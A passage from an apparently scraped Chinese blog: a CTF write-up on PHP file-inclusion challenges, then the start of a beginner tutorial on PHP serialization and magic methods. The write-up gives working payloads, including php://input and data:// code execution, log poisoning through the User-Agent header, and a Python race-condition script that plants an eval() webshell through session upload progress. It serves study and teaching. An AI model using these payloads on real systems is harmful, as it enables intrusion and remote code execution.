str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n虽然过滤了php和data，但是并未过滤大小写呀，我们可以用大小写进行绕过在这里我使用input伪协议，因为data伪协议需要allow_url_fopen:on    allow_url_include :on这里条件不满足，但是我不知道为什么filter在这里也无法使用，暂时保留疑问在url后插入如下语句\n?file=Php://input\n#记得要大写\n然后在post中插入如下数据\n&lt;?php system('ls');?>\n执行结果如下发现flag在fl0g.php中，我们更改post内容即可\n&lt;?php system('tac fl0g.php');\n执行结果如下\n0X04&lt;?php\n\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    if(preg_match(\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\", $file))&#123;\n        die(\"error\");\n    &#125;\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125; \n这个的话我们可以利用data伪协议进行绕过，构造payload如下\n?file=data://text/plain;base64,PD89IGBjYXQgZioucGhwYDs/Pg\n执行结果其实语句本来是\n本来是data://text/plain;base64,PD89IGBjYXQgZioucGhwYDs/Pg==\n但过滤了=，因此把=删去\n把等号删去此时还有分号，有分号语句就可以执行，本地测试如下\n文件包含（日志包含类）&lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n0X01当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。  利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。知道服务器的日志位置，我们可以去包含这个文件从而拿到shell\napache一般是/var/log/apache/access.log。\nnginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log\n我们试着访问日志文件\n?file=/var/log/nginx/access.log\n成功访问到了，我们发现user-agent的信息出来了，因此我们可以利用user-agent植入语句从而获取flag，具体操作如下开启bp，修改get信息为日志路径?file=/var/log/nginx/access.log，修改ua为&lt;?php system(&#39;ls&#39;);?&gt;,执行结果如下发现flag在fl0g.php中，此时我们修改ua为&lt;?php system(&#39;cat flag.php&#39;);?&gt;，执行结果如下\n0X02&lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n\n同上关类似，但本关过滤了:因此我们无法再使用伪协议，但仍可以借助日志包含漏洞来进行构造payload如下即可\n?file=/var/log/nginx/access.log\n同时修改ua为\n&lt;?php system('cat flag.php')?>\n\n\n文件包含实战（条件竞争）0X01 &lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    $file = str_replace(\".\", \"???\", $file);\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125; \n本关把.给ban了，那么只能够利用无后缀的文件，众所周知php中只有session文件是无后缀的，因此我们需要构造一个session文件，再用session.upload_progress将木马写入session文件，设置cookie可以自动初始化session文件，设置cookie:PHPSESSID=flagphp就会在服务器上创建一个文件/tmp/sess_flag，这个文件的键值是ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name值组成，最后被写到session中，那我们在PHP_SESSION_UPLOAD_PROGRESS中编写我们的恶意语句，就成功的写到了session中，我们的session文件是有了，但是接下来看这些php内置函数\nsession.auto_start = off\n// 如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的\nsession.upload_progress.enabled = on\n// 默认开启这个选项，表示upload_progress功能开始，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。\nsession.upload_progress.cleanup = on\n// 默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。\nsession.upload_progress.prefix = \"upload_progress_\"\nsession.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"\n// 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值。\nsession.upload_progress.freq = \"1%\"\nsession.upload_progress.min_freq = \"1\"\n// session.upload_progress.freq = \"1%\"+session.upload_progress.min_freq = \"1\"：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。\n当session.upload_progress.cleanup = on开启时，文件上传完会立即清除session文件中的内容，我们该怎么办呢，这时候就用到了文件竞争，一个POST传session，一个GET对session文件进行请求，两者同时进行就可以达到我们的目的，构造表单如下\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;body>\n&lt;form action=\"http://9cb9ab98-2b0a-4259-98b1-fb1902156765.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\">\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    &lt;input type=\"file\" name=\"file\" />\n    &lt;input type=\"submit\" value=\"submit\" />\n&lt;/form>\n&lt;/body>\n&lt;/html>\n随便传入个文件(为了配合PHP_SESSION_UPLOAD_PROGRESS)，然后抓包，修改cookie为PHPSESSID=flag，控制session文件名随便设置一个变量，要不然无法执行爆破发送到爆破模块，在PHP_SESSION_UPLOAD_PROGRESS下写入我们的恶意语句，此时设置payload为null payloads模式再抓一个靶场包，设置文件路径为tmp/sess_flag，在下方随便设置一个变量，方便爆破，payload设置同上，然后两个同时开启爆破，即可获取我们恶意语句的结果\n\n参考文章https://www.freebuf.com/vuls/202819.htmlhttps://www.cnblogs.com/chalan630/p/14147602.html\n0X02Warning: session_destroy(): Trying to destroy uninitialized session in /var/www/html/index.php on line 14\n&lt;?php\nsession_unset();\nsession_destroy();\n\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    $file = str_replace(\".\", \"???\", $file);\n\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125; \n本关进去就提示了要求摧毁未初始化session的警告，我们发现相比上关多了两个函数，对函数介绍如下\n session_unset()\n释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的session\nid\n\nsession_destroy()\n删除当前用户对应的session文件以及释放session\n可以看出这两个是完全将session给删除了，那我们只需要在表单构造时加上session_start()即可创建新的session文件，利用文件竞争同样可以达到目的，表单构造如下\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;body>\n&lt;form action=\"http://9cb9ab98-2b0a-4259-98b1-fb1902156765.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\">\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    &lt;input type=\"file\" name=\"file\" />\n    &lt;input type=\"submit\" value=\"submit\" />\n&lt;/form>\n&lt;/body>\n&lt;/html>\n&lt;?php \nsession_start();\n?>\n这里引用脚本(82-76通用)\nimport threading\nimport io \nimport requests\n\nurl='http://e452861c-2e24-45d7-85cb-081b143cf342.challenge.ctf.show:8080/'#传入url\ndata=&#123;\n    '1':\"file_put_contents('/var/www/html/2.php','&lt;?php eval($_POST[2]);?>');\" #写入2.php文件，文件内容为一句话木马\n    &#125;\nsessionid='quan9i' #传入session文件名\ndef write(session): #自定义写入session文件函数\n    fileBytes=io.BytesIO(b'a'*1024*50) #括号内的b表示后面字符串是bytes类型。这里传入了50kb\n    while True:\n        response=session.post(url,\n        data=&#123;\n            'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php eval($_POST[1]);?>'#传入的session文件中的内容为一句话木马\n        &#125;,\n        cookies=&#123;\n            'PHPSESSID':sessionid #文件名为sessionid，sessionid是quan9i，因此这里的文件名就是quan9i\n        &#125;,\n        files=&#123;\n            'file':('quan9i.jpg',fileBytes)#路径是quan9i.jpg文件，文件大小是50kb\n        &#125;\n        )\n        #printf(response)\ndef read(session):#自定义读取session文件函数\n    while True:\n        response=session.post(url+'?file=/tmp/sess_'+sessionid,data=data,cookies=&#123;#这里写入tmp是为了包含session文件，session文件执行的的是1,1的参数对应的数据是写入文件2.php，文件2.php对应的内容是执行2\n            'PHPSESSID':sessionid #读取路径是tmp/sess_quan9i\n        &#125;\n        )\n        response2=session.get(url+'2.php')\n        if response2.status_code==200:#如果返回正常\n            print('[+++++++++++++++++YES+++++++++++++++++]')\n        else:\n            print(response2.status_code)#输出状态码\n\nif __name__=='__main__':\n    event=threading.Event()\n    with requests.session() as session:\n        for i in range(5):#五个进程\n            threading.Thread(target=write,args=(session,)).start()\n        for i in range(5):\n            threading.Thread(target=read,args=(session,)).start()\n    event.set()#初始化\n    '''\n    整体思路\n    首先写入url,我们需要往里面传入数据,所以我们这里data传入一个php文件,传到默认路径下，文件内容为一句话木马，为了\n    控制session文件名,我们设置sessionid为quan9i,此时开始定义写文件函数,首先需要写入一个在session文件中写入一个文件,大小\n    设置为50kb即可,之所以要写入文件是为了配合PHP_SESSION_UPLOAD_PROGRESS,这个东西是监测文件上传进度的，如果不传文件的话，\n    我们啥也监测不了，这个语句就有问题了,然后设置cookie为PHPSESSID=sessionid,\n    此时sessionid就是我们之前设置的quan9i,这时就确定了session文件的路径是/tmp/sess_quan9i,\n    此时我们监测的文件还没传，上方写入的文件需要传进去,我们传进去就可以了,此时可以printf(response)来查看响应进而确定是否成功写入文件\n    此时再自定义读文件,首先post包含我们的session文件,并设置cookie与之前相同,这个目的是为了执行session中的代码,session文件执行的是参数1,参数1在最上方对应\n    的是写入2.php文件,2.php文件对应的是执行参数2,\n    如果执行成功就输出+++YES+++,错误时返回状态码\n    '''\n为什么脚本可以用，是因为脚本使用了多线程竞争的方法。什么是多线程竞争?线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:\n数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。\n这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)之间也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。\n参考文章https://blog.csdn.net/qq_46918279/article/details/120106832\n0X03&lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    $file = str_replace(\".\", \"???\", $file);\n    system(\"rm -rf /tmp/*\");\n    include($file);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n此时他多了一个删除/tmp/路径下的文件，且无法找回的语句，但是我们仍然可以利用多线程来进行，这是因为多进程同时进行多个的缘故，我们一边   system(&quot;rm -rf /tmp/*&quot;);， 一边include($file);，两者之间是有间隔的,就会出现一边刚删除完一个session文件，另一个线程创建了一个文件，此时就被包含进去，从而成功执行了我们的恶意语句\n0X04&lt;?php\n \ndefine('还要秀？', dirname(__FILE__));\nset_include_path(还要秀？);\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    $file = str_replace(\".\", \"???\", $file);\n    include($file);\n \n    \n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n先了解一下函数\ndirname() 函数返回路径中的目录部分。比如/tmp/sess_quan9i就返回/tmp/\ndefine() 函数定义一个常量。\n常量类似变量，不同之处在于：\n    在设定以后，常量的值无法更改\n    常量名不需要开头的美元符号 ($)\n    作用域不影响对常量的访问\n    常量值只能是字符串或数字\n define(name,value,case_insensitive)\n参数 \t\t\t\t描述\nname \t\t\t\t必需。规定常量的名称。\nvalue \t\t\t\t必需。规定常量的值。\ncase_insensitive \t可选。规定常量的名称是否对大小写敏感。\nset_include_path简单理解的话就是给include定义了一个路径\n限制了include()的路径，但是并不影响上一题的payload，继续使用上一题的方法。\n原因如下：平时include()文件的时候，PHP先会在当前目录下找找有没有这个路径，如果没有，然后就会在include paths里面找\n所谓的include paths不是一个目录，而是很多个目录，这些目录可以通过get_include_path();得到。\n参考文章https://www.jianshu.com/p/9fff4501f56b\n文件包含(绕死亡die())附上p神文章https://www.leavesongs.com/PENETRATION/php-filter-magic.html\n &lt;?php\nif(isset($_GET['file']))&#123;\n    $file = $_GET['file'];\n    $content = $_POST['content'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    $file = str_replace(\".\", \"???\", $file);\n    file_put_contents(urldecode($file), \"&lt;?php die('大佬别秀了');?>\".$content);\n\n    \n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125; \n本关我们先了解一下函数\nint file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )\n\n\n参数 \t描述\nfile \t必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。\ndata \t必需。规定要写入文件的数据。可以是字符串、数组或数据流。\nmode \t可选。规定如何打开/写入文件。可能的值：\n\n    FILE_USE_INCLUDE_PATH\n    FILE_APPEND\n    LOCK_EX\n\ncontext \t可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。\n可以看出是对文件名进行了url编码，因此我们的file需要进行二次url编码，因为服务器还会自动解码一次，此时我们可以利用伪协议base64解码，来绕过死亡die，因为base64解码，只解码常规的0-9和A-Z已经/，所以识别的就是phpdie，我们在构造content时前面加上aa即可成功绕过（base64每四位一节）,构造payload如下\n?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30\n解码两次后为php://filter/convert.base64-decode/resource=1.php\ncontent=aaPD9waHAgc3lzdGVtKCdscycpOz8+\nbase64解码后为aa&lt;?php system('ls');?>\n\n可能有部分师傅不知道去哪里进行url全编码，网上的工具大多数都未全编码，这里我使用的是bp。bp的decoder模块可以进行全编码\n有趣的文件包含0X01本关的话打开是个电影，我们抓包然后进行猜测，构造payload如下\nGET /index.php?file=var/www/html/index.php\n然后可以发现过滤规则\n&lt;?php\nerror_reporting(0);\nfunction filter($x)&#123;\n    if(preg_match('/http|https|data|input|rot13|base64|string|log|sess/i',$x))&#123;\n        die('too young too simple sometimes naive!');\n    &#125;\n&#125;\n$file=isset($_GET['file'])?$_GET['file']:\"5.mp4\";\nfilter($file);\nheader('Content-Type: video/mp4');\nheader(\"Content-Length: $file\");\nreadfile($file);\n?>\n此时我们修改变量，让他包含flag文件，那不就直接读取了吗，因为readfile($file);，所以构造payload如下\nGET /index.php?file=var/www/html/flag.php\n0X02&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($x)&#123;\n    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x))&#123;\n        die('too young too simple sometimes naive!');\n    &#125;\n&#125;\n$file=$_GET['file'];\n$contents=$_POST['contents'];\nfilter($file);\nfile_put_contents($file, \"&lt;?php die();?>\".$contents); \n这关的话过滤了data64和rot13，但是还有很多，例如convert.iconv.UCS-2LE.UCS-2BE编码，这个编码就是将一部分内容进行交换位置，因此我们构造payload如下\n?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\ncontents=?&lt;hp pvela$(P_SO[T]1;)>?\n此时访问a.php，构造payload如下\n1=system('ls');\n\n\n","slug":"浅析文件包含","date":"2022-06-18T09:25:28.000Z","categories_index":"WEB知识","tags_index":"文件包含","author_index":"quan9i"},{"id":"7521324f3a376c53e83c35f44da3ffc9","title":"从零基础入门PHP反序列化","content":"前言反序列化是一个尤为重要的知识点，最近对反序列化进行了简单学习，并总结如下，希望能对正在学习的师傅有所帮助。\n前提了解序列化和反序列化学习反序列化之前，首先要知道序列化，简单的举个栗子来说\n&lt;?php\n$a='quan9i';\necho \"----------初始数据------------&lt;br>\";\necho $a.\"&lt;br>\";\necho \"-----------序列化后的数据-----------&lt;br>\";\n$b=serialize($a);\necho $b.\"&lt;br>\";\necho \"-----------反序列化序列化数据后的数据-----------&lt;br>\";\n$c=unserialize($b);\necho $c;\n?>\n\n序列化就是使数据持久化存储，因为数据用过后就会自动销毁，本来是无法进行存储的，当序列化时，就会把数据存储起来，而反序列化呢就是把序列化的数据恢复成最初的状态。这里你会发现序列化的数据它带有s:6，其实是string型，6个字母的意思，对此再举个栗子\n&lt;?php\nclass xianzhi&#123; //创建一个类，类名为xianzhi\n    public $age='19';//定义公共变量age，并赋值19\n    public $name='quan9i';//定义公共变量name，并赋值quan9i\n    public function __construct()//定义construct魔术函数,实例化此类时就会调用此方法\n    &#123;\n      echo 'xianzhi  '.$this->name . ' is ' . $this->age . ' years old&lt;br>';//调用两个属性，输出一句话\n    &#125;\n&#125;\n$a=new xianzhi();//实例化对象\necho serialize($a);//输出序列化后的\n?>\n此时的输出结果\nxianzhi quan9i is 19 years old\nO:7:\"xianzhi\":2:&#123;s:3:\"age\";s:2:\"19\";s:4:\"name\";s:6:\"quan9i\";&#125;\n此时就可以看出序列化后这里有多个字母，下面依次来进行解释\nO:7:\"xianzhi\":2:&#123;s:3:\"age\";s:2:\"19\";s:4:\"name\";s:6:\"quan9i\";&#125;\n对象类型:长度：类名：变量个数:&#123;类型:长度:\"值\";类型:长度:\"值\";类型:长度:\"值\";类型:长度:\"值\";&#125;\n字母的含义如下\na - array                  b - boolean  \nd - double                 i - integer\no - common object          r - reference\ns - string                 C - custom object\nO - class                  N - null\nR - pointer reference      U - unicode string\n正常遇到的这种反序列化和序列化都是和PHP类与对象这部分知识点相关联的，所以我们需要简单了解类和对象这个知识点，同时掌握魔术方法的基础用法\n面向对象（部分）类类− 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。举个例子，全部的小狗就是一个类,代码实例如下\n&lt;?php\nclass phpClass &#123; //phpClass是这个类的名字，类在定义时需要加上class\n  var $var1; //成员变量，名字是var1\n  var $var2 = \"constant string\"; //成员变量\n \n  function myfunc ($arg1, $arg2) &#123; //定义成员函数\n     [..]//函数中的内容\n  &#125;\n  [..]\n&#125;\n?>\n官方解析如下：\n类使用 class 关键字后加上类名定义。\n \n类名后的一对大括号(&#123;&#125;)内可以定义变量和方法。\n \n类的变量使用 var 来声明, 变量也可以初始化值。\n \n函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。\n对象对象− 是类的实例。全部的小狗只是一个虚拟化的东西，当面前有一只狗时，我们就可以说这个狗是一个对象。类和对象简单理解如下\n$mercedes = new Car ();// Car()在这里是个类名，new +类名可以实例化一个对象，这里的$mercedes就是我们的对象名\n$bmw = new Car ();\n$audi = new Car ();\n\n成员变量成员变量− 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。\n成员函数成员函数− 定义在类的内部，可用于访问对象的数据。\n完整构造过程定义类此时大致知道了类的组成，我们来看一个实例，实例如下\n&lt;?php\nclass Site &#123;\n  /* 成员变量 */\n  var $url;\n  var $title;\n \n  /* 成员函数 */\n  function setUrl($par)&#123; //设置url方法\n     $this->url = $par;\n  &#125;\n \n  function getUrl()&#123; //获取url方法\n     echo $this->url . PHP_EOL;\n  &#125;\n \n  function setTitle($par)&#123; //设置标题方法\n     $this->title = $par;\n  &#125;\n \n  function getTitle()&#123; //获取标题方法\n     echo $this->title . PHP_EOL;\n  &#125;\n&#125;\n?>\n创建对象前面我们定义了一个类，它的类名是Site，那这里我们想要把它变成对象，该怎么办呢，这时候就可以用new +类名来实例化对象\n$php = new Site; //创建了对象php\n调用成员方法此时拥有了对象，那我们就可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量\n$php->setUrl(\"www.php.cn\");//调用设置url方法并赋值\n$php->setTitle('PHP中文网');//调用设置title方法并赋值\n此时我们再用剩下的两个获取方法\n$php->getUrl();\n$php->getTitle();\n此时就构造完了，我们把语句总合到一起，也就是\n&lt;?php\nclass Site &#123;\n  /* 成员变量 */\n  var $url;\n  var $title;\n \n  /* 成员函数 */\n  function setUrl($par)&#123; //设置url方法\n     $this->url = $par;\n  &#125;\n \n  function getUrl()&#123; //获取url方法\n     echo $this->url . PHP_EOL;\n  &#125;\n \n  function setTitle($par)&#123; //设置标题方法\n     $this->title = $par;\n  &#125;\n \n  function getTitle()&#123; //获取标题方法\n     echo $this->title . PHP_EOL;\n  &#125;\n&#125;\n$php = new Site; //创建了对象php\n$php->setUrl(\"www.php.cn\");//调用设置url方法并赋值\n$php->setTitle('PHP中文网');//调用设置title方法并赋值\n$php->getUrl();\n$php->getTitle();\n?>\n结果如下\n魔术方法常见魔术方法有以下几种\n__construct()   当一个对象创建时被调用，\n__destruct()   当一个对象销毁时被调用，\n__toString()   当一个对象被当作一个字符串被调用。\n__wakeup()   使用unserialize时触发\n__sleep()    使用serialize时触发\n__destruct()    对象被销毁时触发\n__call()    在对象上下文中调用不可访问的方法时触发\n__callStatic()    在静态上下文中调用不可访问的方法时触发\n__get()    用于从不可访问的属性读取数据\n__set()    用于将数据写入不可访问的属性\n__isset()    在不可访问的属性上调用isset()或empty()触发\n__unset()     在不可访问的属性上使用unset()时触发\n__toString()    把类当作字符串使用时触发,返回值需要为字符串\n__invoke()   当脚本尝试将对象调用为函数时触发\n这是整体的，但这样看似乎显得过于抽象，因此我们将其进行分类，依次进行举例讲解\n__construct()与__destruct()__construct ： 在创建对象时候初始化对象，一般用于对变量赋初值。\n__destruct ： 和构造函数相反，当对象所在函数调用完毕后执行。\n\n&lt;?php\nclass bai&#123;\n\tpublic $name;\n\tpublic $age;\n\tpublic function __construct()\n    &#123;\n\t\techo \"__construct()初始化&lt;br>\";\n\t\t$this->name;\n\t\t$this->age;\n\t&#125;\n    public function __destruct()\n    &#123;\n        echo \"__destruct()执行结束\";\n    &#125;\t\t\n &#125;\n $a=new bai(); //创建一个对象命名为a\n /*\n 赋值\n $a->name='quan9i'; //给对象a里的name赋值为quan9i\n $a->age=19; //给对象a里的age赋值为19\n echo(serialize($a)); //输出序列化后的$a\n */\n但这是一种，__destruct还有一种利用方式，就是__destruct()    对象被销毁时触发，它的栗子如下\n&lt;?php\nclass bai&#123;\n\tpublic $name;\n\tpublic $age;\n\tpublic function __construct($name,$age)\n    &#123;\n\t\techo \"__construct()初始化&lt;br>\";\n\t\t$this->name=$name;//将传入的第一个参数赋值给name变量\n\t\t$this->age=$age;\n\t&#125;\n    public function __destruct()\n    &#123;\n        echo \"__destruct()执行结束&lt;br>\";\n    &#125;\t\t\n &#125;\n //主动销毁\n $a=new bai('quan9i',19);\n unset ($a);//主动销毁对象，此时先触发destruct魔法函数再echo\n echo\"777&lt;br>\";\n echo \"------------分隔符----------------&lt;br>\";\n //自动销毁\n $b=new bai('quan9i',19);\n echo \"123&lt;br>\";\n //此时先echo再触发destruct函数\n?>\n执行结果\n__sleep()__sleep()    serialize 之前被调用，可以指定要序列化的对象属性。\n\n&lt;?php\nclass bai&#123;\n\tpublic $name;\n\tpublic $age;\n\tpublic function __construct($name,$age)\n    &#123;\n\t\techo \"__construct()初始化&lt;br>\";\n\t\t$this->name=$name;\n\t\t$this->age=$age;\n\t&#125;\n    public function __sleep()\n    &#123;\n        echo \"当使用serialize时触发此方法&lt;br>\";\n        return array('name','age');\n    &#125;   \n&#125;\n$a=new bai('quan9i',19);\necho serialize($a);\n?>\n\n__wakeup()__wakeup()   反序列化恢复对象之前调用该方法\n实例如下\n&lt;?php\nclass bai&#123;\n\tpublic $name;\n\tpublic $age;\n\tpublic function __construct($name,$age)\n    &#123;\n\t\techo \"__construct()初始化&lt;br>\";\n\t\t$this->name=$name;\n\t\t$this->age=$age;\n\t&#125;\n    public function __wakeup()\n    &#123;\n        echo \"当使用unserialize时触发此方法&lt;br>\";\n        $this->age=1000;//更改$age的值为1000\n    &#125;\n&#125;\n$a=new bai('quan9i',19);\n$b= serialize($a);\nvar_dump(unserialize($b));\n?>\n\n__toString()__toString() ：在对象当做字符串的时候会被调用。\n实例如下\n&lt;?php\n\nclass Test\n&#123;\n    public $a = 'This is a string';\n\n    public function good()&#123;\n        echo $this->a.'&lt;br />';\n    &#125;\n\n    // 在对象当做字符串的时候会被调用\n    public function __toString()\n    &#123;\n        return '__toString方法被调用 &lt;br>';\n    &#125;\n&#125;\n\n$a = new Test();\n$a->good();\necho $a;\n?>\n\n__invoke()__invoke() ：将对象当作函数来使用时执行此方法。\n\n示例如下\n&lt;?php\n\nclass Test&#123;\n    public $data =\"调用正常方法&lt;br>\";\n\n    public function __invoke()\n    &#123;\n        echo\"调用__invoke()方法\";\n    &#125;\n&#125;\n$a= new test();\necho $a();\n?>\n\n__get__get() 访问不存在的成员变量时调用的\n实例如下\n&lt;?php\n\nclass Test &#123;\n    public $n=123;\n    public function __get($name)&#123;\n        echo '__get方法被调用，其中不存在变量'.$name.'&lt;br>';\n    &#125;\n&#125;\n$a = new Test();\necho $a->quan9i;//调用对象a中的变量quan9i，由于不存在quan9i这个变量，这时候就会调用__get魔术方法\n?>\n\nset__set() ：设置不存在的成员变量时调用的；\n\n&lt;?php\n\nclass xg&#123;\n    public $data = 100;\n    protected $test=0;\n\n    public function __set($name,$value)&#123;\n        echo '__set 不存在成员变量 '.$name.'&lt;br>';\n        $this->test=$value;\n    &#125;\n\n    public function show()&#123;\n        echo $this->test;\n    &#125;\n&#125;\n\n$a = new xg();\n$a->show(); //调用Get方法，这里就是输出test的值\necho '&lt;br>';\n$a->test= 777; // 给私有变量test赋值为777，但此时它是私有变量，就会调用__set，此时就会更改\n$a->show();\necho '&lt;br>';\n$a->quan9i = 566;// 设置对象不存在的属性\n$a->show();// 经过__set方法的设置值为566\n?>\n\n\n\n不理解的话可以进行调试，可以看见这里在调用私有变量test后走向了__set魔术方法，然后$name就是我们调用的变量，$value就是我们设置的值777再看这个本来不存在的变量，它也是会调用这个__set魔术方法的，你可以在这里打断点，调试一下会发现此时这里设置了$name=quan9i，$value=566\n__call()__call ：当调用对象中不存在的方法会自动调用该方法\n示例如下\n&lt;?php\n\nclass Test&#123;\n    public $data =\"调用正常方法&lt;br>\";\n    public function __call($name,$value)&#123;\n        echo \"__call被调用，Test类中不存在方法\".$name.'&lt;br>';\n        var_dump($value);\n    &#125;\n    public function show()&#123;\n        echo $this->data;\n    &#125;\n&#125;\n$a= new test();\n$a->show(); //调用正常方法\necho\"--------------------分隔符----------------&lt;br>\";\n$a->quan9i('quan9i',123); //调用一个不存在的方法，此时就调用了__call魔术方法\n\n?>\n\nisset()__isset() : 检测对象的某个属性是否存在时执行此函数。\n实例如下\n&lt;?php\n\nclass test&#123;\n    public $name;\n    private $age;\n\n    public function __construct($name, $age)&#123;\n        $this->name = $name;\n        $this->age = $age;\n    &#125;\n\n    // __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。\n    public function __isset($content)&#123;\n        echo \"当使用isset()函数，自动调用&lt;br>\";\n        return isset($this->$content);\n    &#125;\n&#125;\n\n$a = new test(\"quan9i\", 19);\n// public 成员\necho ($a->name),\"&lt;br>\";\n// private 成员\necho isset($a->name);\necho \"-----------分隔符--------------&lt;br>\";\necho isset($a->age);\n?>\n可以发现私有属性时会调用issset魔术方法(调用protect的属性也会调用)\n__unset()__unset() ：在不可访问的属性上使用 unset () 时触发\n实例如下\n&lt;?php\n\nclass test&#123;\n    public $name;\n    private $age;\n\n    public function __construct($name, $age)&#123;\n        $this->name = $name;\n        $this->age = $age;\n    &#125;\n\n    \n    public function __unset($content)&#123;\n        echo \"当使用unset()函数，自动调用&lt;br>\";\n        echo \"quan9i will be the best\";\n    &#125;\n&#125;\n\n$a = new test(\"quan9i\", 19);\n// public 成员\nunset($a->name);\necho \"&lt;br>\";\n// private 成员\necho \"-----------分隔符--------------&lt;br>\";\nunset($a->age);\necho \"&lt;br>\";\n?>\n\n可以发现当对一个公有属性进行unset的时候，会删除它，而私有变量则会调用unset函数\n常用魔术函数汇总例子&lt;?php\nclass test&#123;\n public $varr1=\"abc\";\n public $varr2=\"123\";\n public function echoP()&#123;\n  echo $this->varr1.\"&lt;br>\";\n &#125;\n public function __construct()&#123;\n  echo \"__construct&lt;br>\";\n &#125;\n public function __destruct()&#123;\n  echo \"__destruct&lt;br>\";\n &#125;\n public function __toString()&#123;\n  return \"__toString&lt;br>\";\n &#125;\n public function __sleep()&#123;\n  echo \"__sleep&lt;br>\";\n  return array('varr1','varr2');\n &#125;\n public function __wakeup()&#123;\n  echo \"__wakeup&lt;br>\";\n &#125;\n&#125;\n\n$obj = new test();  //实例化对象，调用__construct()方法，输出__construct\n$obj->echoP();   